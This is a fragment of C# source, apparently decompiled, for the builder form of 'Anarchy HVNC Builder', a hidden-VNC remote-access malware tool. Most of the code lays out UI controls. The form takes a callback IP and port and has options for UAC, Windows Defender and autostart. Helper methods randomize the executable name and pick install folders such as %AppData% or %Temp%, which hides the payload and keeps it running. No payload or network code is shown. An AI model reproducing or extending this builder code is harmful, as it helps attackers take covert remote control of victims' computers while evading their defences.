            this.txtIdentifier.DisabledState.Parent = this.txtIdentifier;
            this.txtIdentifier.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.txtIdentifier.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
            this.txtIdentifier.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtIdentifier.FocusedState.Parent = this.txtIdentifier;
            this.txtIdentifier.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.txtIdentifier.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.txtIdentifier.HoverState.Parent = this.txtIdentifier;
            this.txtIdentifier.Location = new System.Drawing.Point(27, 132);
            this.txtIdentifier.Name = "txtIdentifier";
            this.txtIdentifier.PasswordChar = '\0';
            this.txtIdentifier.PlaceholderText = "";
            this.txtIdentifier.SelectedText = "";
            this.txtIdentifier.SelectionStart = 11;
            this.txtIdentifier.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
            this.txtIdentifier.ShadowDecoration.Depth = 10;
            this.txtIdentifier.ShadowDecoration.Enabled = true;
            this.txtIdentifier.ShadowDecoration.Parent = this.txtIdentifier;
            this.txtIdentifier.Size = new System.Drawing.Size(328, 23);
            this.txtIdentifier.TabIndex = 196;
            this.label6.AutoSize = true;
            this.label6.BackColor = System.Drawing.Color.Transparent;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f);
            this.label6.Location = new System.Drawing.Point(24, 113);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(91, 16);
            this.label6.TabIndex = 197;
            this.label6.Text = "Group Name :";
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            base.ClientSize = new System.Drawing.Size(442, 411);
            base.Controls.Add(this.label6);
            base.Controls.Add(this.txtIdentifier);
            base.Controls.Add(this.btnBuild);
            base.Controls.Add(this.checkUAC);
            base.Controls.Add(this.checkWD);
            base.Controls.Add(this.checkAutostart);
            base.Controls.Add(this.btnRandomInstallPath);
            base.Controls.Add(this.txtInstallPath);
            base.Controls.Add(this.btnRandomFolder);
            base.Controls.Add(this.txtFolder);
            base.Controls.Add(this.btnRandomizeFileName);
            base.Controls.Add(this.txtFilename);
            base.Controls.Add(this.txtPort);
            base.Controls.Add(this.txtIP);
            base.Controls.Add(this.guna2Panel2);
            base.Controls.Add(this.label5);
            base.Controls.Add(this.label4);
            base.Controls.Add(this.label3);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.label7);
            base.Controls.Add(this.label24);
            this.ForeColor = System.Drawing.Color.GhostWhite;
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Name = "FrmBuilder";
            base.Opacity = 0.98;
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Anarchy HVNC Builder";
            base.Load += new System.EventHandler(FrmBuilder_Load);
            this.guna2Panel2.ResumeLayout(false);
            this.guna2Panel2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.txtPort).EndInit();
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void btnRandomizeFileName_Click(object sender, EventArgs e)
        {
            this.txtFilename.Text = FrmBuilder.RandomString(9) + ".exe";
        }

        private void btnRandomInstallPath_Click(object sender, EventArgs e)
        {
            string[] array;
            array = new string[5] { "%AppData%", "%ProgramData%", "%Temp%", "%LocalAppData%", "%ProgramFiles" };
            this.txtInstallPath.Text = array[FrmBuilder.random.Next(0, array.Length)];
        }

        private void btnRandomFolder_Click(object sender, EventArgs e)
        {
            this.txtFolder.Text = FrmBuilder.RandomString(9);
        }
    }
}
